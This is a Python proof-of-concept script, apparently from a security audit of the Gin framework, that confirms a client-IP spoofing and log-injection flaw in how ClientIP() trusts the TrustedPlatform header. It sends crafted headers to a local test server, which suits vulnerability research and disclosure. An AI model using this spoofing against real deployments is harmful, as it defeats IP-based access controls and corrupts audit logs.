#!/usr/bin/env python3
"""
VULN-003 — ClientIP() returns the unvalidated TrustedPlatform header ⇒ spoof + log injection
============================================================================================

Vulnerable code (targets/gin):
    context.go:999-1004  ClientIP(): if engine.TrustedPlatform != "" return requestHeader(TP) VERBATIM, FIRST
    logger.go:185-193    ClientIP rendered with %15s (un-escaped) in the access log

Class: CWE-290 (Auth Bypass by Spoofing) + CWE-117 (Improper Output Neutralization for Logs).

The flaw
--------
When an app sets engine.TrustedPlatform (documented for Cloudflare / Fly.io / App Engine),
ClientIP() returns c.requestHeader(TrustedPlatform) *verbatim and first* — BEFORE the
RemoteIP()/isTrustedProxy checks — with NO net.ParseIP validation. So:
  (1) it defeats a CORRECT SetTrustedProxies (the header is honored regardless of peer);
  (2) the returned value is never IP-validated, so it can carry CR/LF/ANSI and flows into
      the Logger's %15s ClientIP field -> log-line forging / terminal-escape injection.

Exploitation idea
------------------
Against an engine that has a correct SetTrustedProxies([192.0.2.0/24]) (which does NOT
trust the real peer) AND TrustedPlatform="X-CF-Connecting-IP":
  - a plain X-Forwarded-For is correctly IGNORED (proves the proxy config is sound);
  - but X-CF-Connecting-IP: <anything> is returned verbatim as ClientIP.

A successful run proves: a single header defeats a correctly-hardened trusted-proxy setup
and injects an arbitrary, non-IP string into the client-IP value.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import banner, log, verdict, session, base_url, save  # noqa: E402

BASE = base_url(36276)                       # tp engine: SetTrustedProxies([192.0.2.0/24]) + TP=X-CF-Connecting-IP
TP_HEADER = os.environ.get("TP_HEADER", "X-CF-Connecting-IP")
SPOOF = os.environ.get("SPOOF_IP", "6.6.6.6")


def main() -> int:
    banner("VULN-003", "ClientIP() returns unvalidated TrustedPlatform header (spoof + log injection)",
           BASE, "context.go:999-1004 (TrustedPlatform returned verbatim & first)")
    s = session()

    # ---- STEP 1: prove the proxy config is CORRECT — a plain X-Forwarded-For is ignored
    # because the real peer is not in the trusted set (192.0.2.0/24).
    log("STEP", "baseline: X-Forwarded-For: 9.9.9.9 (peer NOT trusted -> must be ignored)")
    b = s.get(BASE + "/ip", headers={"X-Forwarded-For": "9.9.9.9"}).json()
    log("INFO", f"baseline -> clientIP={b['clientIP']!r} remoteIP={b['remoteIP']!r}")
    proxy_config_sound = b["clientIP"] == b["remoteIP"] and b["clientIP"] != "9.9.9.9"

    # ---- STEP 2: TrustedPlatform header is honored verbatim & FIRST, defeating the sound config.
    log("STEP", f"attack: {TP_HEADER}: {SPOOF}  (returned verbatim, before the trust checks)")
    j = s.get(BASE + "/ip", headers={TP_HEADER: SPOOF}).json()
    log("INFO", f"attack -> clientIP={j['clientIP']!r} remoteIP={j['remoteIP']!r}")

    # ---- STEP 3: the value is NOT IP-validated — an arbitrary non-IP string is returned,
    # which (per VULN-003) would flow unescaped into the Logger %15s ClientIP field.
    payload = "not-an-ip-INJECTED-value"
    log("STEP", f"log-inj: {TP_HEADER}: {payload!r}  (no net.ParseIP -> arbitrary string as ClientIP)")
    j2 = s.get(BASE + "/ip", headers={TP_HEADER: payload}).json()
    log("INFO", f"raw-value -> clientIP={j2['clientIP']!r}")

    save(os.path.join(os.path.dirname(__file__), "request.http"),
         f"GET /ip HTTP/1.1\r\nHost: {BASE.split('//',1)[1]}\r\n{TP_HEADER}: {SPOOF}\r\n\r\n")
    save(os.path.join(os.path.dirname(__file__), "response.txt"),
         f"baseline (XFF 9.9.9.9, peer untrusted): {b}\n"
         f"attack   ({TP_HEADER} {SPOOF}):          {j}\n"
         f"raw-value({TP_HEADER} {payload!r}):      {j2}\n")

    spoofed = j["clientIP"] == SPOOF and j["clientIP"] != j["remoteIP"]
    raw_returned = j2["clientIP"] == payload
    if proxy_config_sound and spoofed and raw_returned:
        log("PROOF", f"a CORRECT SetTrustedProxies ignored X-Forwarded-For (clientIP stayed {b['clientIP']}), "
                     f"yet {TP_HEADER} set clientIP to {j['clientIP']} — TrustedPlatform bypasses it")
        log("PROOF", f"non-IP value {payload!r} returned verbatim as ClientIP (no net.ParseIP) "
                     f"-> CR/LF/ANSI would inject into the Logger %15s field")
        log("OK", "exploit confirmed — TrustedPlatform header spoofs ClientIP (defeats SetTrustedProxies) and is unvalidated")
        return verdict("VULN-003", "CONFIRMED",
                       "TrustedPlatform header returned verbatim as ClientIP -> spoof + log-injection primitive")
    log("FAIL", f"config_sound={proxy_config_sound} spoofed={spoofed} raw={raw_returned}")
    return verdict("VULN-003", "FAILED", "TrustedPlatform spoof not reproduced")


if __name__ == "__main__":
    sys.exit(main())
